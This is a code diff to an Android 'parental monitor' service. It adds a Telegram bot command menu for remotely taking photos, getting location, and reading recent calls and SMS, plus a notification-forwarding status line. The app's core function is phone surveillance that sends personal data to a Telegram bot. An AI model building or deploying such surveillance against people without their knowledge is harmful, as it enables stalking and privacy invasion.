@@ -178,6 +178,9 @@ class MonitoringService : Service() {
         }
         android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
         startCommandPolling()
+        serviceScope.launch {
+            registerBotCommands()
+        }
     }
 
     private fun cameraIntervalMillis(): Long {
@@ -271,6 +274,40 @@ class MonitoringService : Service() {
         }
     }
 
+    private fun botCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
+        return listOf(
+            com.redeye.parentalmonitor.network.BotCommand("photo", "Take a photo now"),
+            com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera depan|belakang"),
+            com.redeye.parentalmonitor.network.BotCommand("location", "Send current location"),
+            com.redeye.parentalmonitor.network.BotCommand("lastcalls", "Show last 5 calls"),
+            com.redeye.parentalmonitor.network.BotCommand("lastsms", "Show last 5 SMS"),
+            com.redeye.parentalmonitor.network.BotCommand("photointerval", "Set photo interval 0-60 min"),
+            com.redeye.parentalmonitor.network.BotCommand("pause", "Pause photos for N minutes"),
+            com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
+            com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
+            com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
+            com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
+            com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
+        )
+    }
+
+    private suspend fun registerBotCommands() {
+        try {
+            val botToken = preferencesManager.botToken
+            if (botToken.isEmpty()) return
+            val url = "https://api.telegram.org/bot$botToken/setMyCommands"
+            val body = com.redeye.parentalmonitor.network.SetMyCommandsRequest(botCommandList())
+            val response = TelegramClient.api.setMyCommands(url, body)
+            if (response.isSuccessful && response.body()?.ok == true) {
+                android.util.Log.i("MonitoringService", "Bot command menu registered")
+            } else {
+                android.util.Log.w("MonitoringService", "Command menu registration failed: ${response.code()}")
+            }
+        } catch (e: Exception) {
+            android.util.Log.w("MonitoringService", "Command menu registration error: ${redactToken(e.message)}")
+        }
+    }
+
     private fun mainMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
         fun button(text: String, data: String) =
             com.redeye.parentalmonitor.network.InlineButton(text, data)
@@ -320,6 +357,7 @@ class MonitoringService : Service() {
                         appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                         appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                         appendLine("Background location: ${if (hasBackgroundLocation()) "granted" else "MISSING"}")
+                        appendLine("Notifications: ${if (isNotifForwarding()) "forwarding" else "off"}")
                         appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                     }
                 )
@@ -447,6 +485,15 @@ class MonitoringService : Service() {
             this,
             android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
         ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun isNotifForwarding(): Boolean {
+        if (!preferencesManager.notifForwardEnabled) return false
+        return try {
+            androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
+        } catch (_: Exception) {
+            false
+        }
     }
 
     private fun hasLocationPermission(): Boolean {
@@ -608,10 +655,25 @@ class MonitoringService : Service() {
 
             // Final message
             android.util.Log.i("MonitoringService", "Sending completion message...")
+            val photoState = if (isPhotoPaused()) {
+                "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
+            } else if (preferencesManager.cameraInterval <= 0) {
+                "manual only (/photo)"
+            } else {
+                "every ${preferencesManager.cameraInterval} min"
+            }
             val completeMessage = buildString {
                 appendLine("✅ <b>History sync complete</b>")
                 appendLine()
                 appendLine("From now on, only new SMS and calls will be sent.")
+                appendLine()
+                appendLine("📊 <b>Now</b>")
+                appendLine("Monitoring: ON")
+                appendLine("Data interval: ${preferencesManager.syncInterval} min")
+                appendLine("Photos: $photoState")
+                appendLine("Queued: ${messageQueue.getQueueSize()}")
+                appendLine()
+                appendLine("All commands are in the bot menu — tap /help anytime.")
             }
             sendToTelegram(completeMessage)
             preferencesManager.initialSyncDone = true
